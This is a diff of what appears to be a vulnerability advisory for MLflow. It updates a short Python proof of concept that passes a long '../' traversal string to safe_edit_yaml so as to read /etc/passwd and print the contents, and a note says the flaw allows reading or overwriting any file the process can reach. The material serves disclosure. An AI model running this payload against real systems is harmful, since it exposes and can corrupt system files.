@@ -145,11 +145,13 @@ By supplying a `file_name` value containing directory traversal sequences, an at
 ```python
 import mlflow
 
-mlflow.utils.yaml_utils.safe_edit_yaml(
-    "/home/user/research/",
-    "../../etc/passwd",
+obj = mlflow.utils.yaml_utils.safe_edit_yaml(
+    "/home/hadi/",
+    "../../../../../../../../../../etc/passwd",
     lambda x: x
 )
+
+print(obj._original)
 ```
 
 > **Note:** The `file_name` parameter accepts any string — no `.yaml` or `.yml` extension is required, and no directory boundary check is enforced. This technique can be used to read or overwrite any file accessible to the MLflow process.
